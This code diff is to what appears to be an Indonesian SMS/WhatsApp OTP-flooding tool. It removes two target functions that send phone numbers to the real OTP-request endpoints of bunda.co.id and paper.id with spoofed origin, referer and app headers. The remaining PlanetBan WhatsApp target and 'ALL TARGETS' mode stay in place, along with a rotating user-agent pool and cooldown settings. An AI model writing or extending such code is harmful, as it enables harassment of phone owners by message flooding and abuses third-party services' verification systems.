@@ -39,14 +39,10 @@ console = Console()
 # ══════════════════════════════════════════════════════════════
 
 APIS = {
-    1: {"name": "Bunda.co.id",  "desc": "SMS",       "tag": "BND",
-        "cooldown": 180, "color": "bright_magenta", "method": "bunda"},
-    2: {"name": "Paper.id SMS", "desc": "SMS",       "tag": "PPR",
-        "cooldown": 35,  "color": "bright_green",   "method": "paper_sms"},
-    3: {"name": "PlanetBan",    "desc": "WhatsApp",  "tag": "PLB",
-        "cooldown": 60,  "color": "bright_red",     "method": "planetban"},
-    4: {"name": "ALL TARGETS",  "desc": "Semua API", "tag": "ALL",
-        "cooldown": 0,   "color": "bold cyan",      "method": "all"},
+    1: {"name": "PlanetBan",   "desc": "WhatsApp",  "tag": "PLB",
+        "cooldown": 60, "color": "bright_red",  "method": "planetban"},
+    2: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
+        "cooldown": 0,  "color": "bold cyan",   "method": "all"},
 }
 
 UA_POOL = [
@@ -267,34 +263,6 @@ def safe_post(url: str, headers: dict, data=None, files=None,
 #  API FUNCTIONS
 # ══════════════════════════════════════════════════════════════
 
-def send_bunda(phone: str) -> dict:
-    return safe_post(
-        "https://cms.bunda.co.id/api/v1/auth/send-otp",
-        headers=_h(**{
-            "Content-Type": "application/json",
-            "x-locale": "id",
-            "origin":    "https://www.bunda.co.id",
-            "referer":   "https://www.bunda.co.id/id/hospitals",
-            "x-requested-with": "com.chimbori.hermitcrab",
-        }),
-        data=json.dumps({"phone_number": int(phone), "type": "auth"}),
-    )
-
-def send_paper_sms(phone: str) -> dict:
-    return safe_post(
-        "https://register.paper.id/api/v1/auth/register/send-otp",
-        headers=_h(**{
-            "Content-Type": "application/json",
-            "authorization": "",
-            "x-paper-user-agent": "multiverse/2.58.1 mobile_web (android) chrome",
-            "origin":  "https://paper.id",
-            "referer": "https://paper.id/",
-            "x-requested-with": "com.chimbori.hermitcrab",
-        }),
-        data=json.dumps({"phone": phone, "method": "sms",
-                         "registered_by": "flutter mweb"}),
-    )
-
 def send_planetban(phone: str) -> dict:
     num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
     pb  = "0" + num[2:]
@@ -310,8 +278,6 @@ def send_planetban(phone: str) -> dict:
     )
 
 def dispatch(method: str, phone: str) -> dict:
-    if method == "bunda":     return send_bunda(phone)
-    if method == "paper_sms": return send_paper_sms(phone)
     if method == "planetban": return send_planetban(phone)
     return {}
 
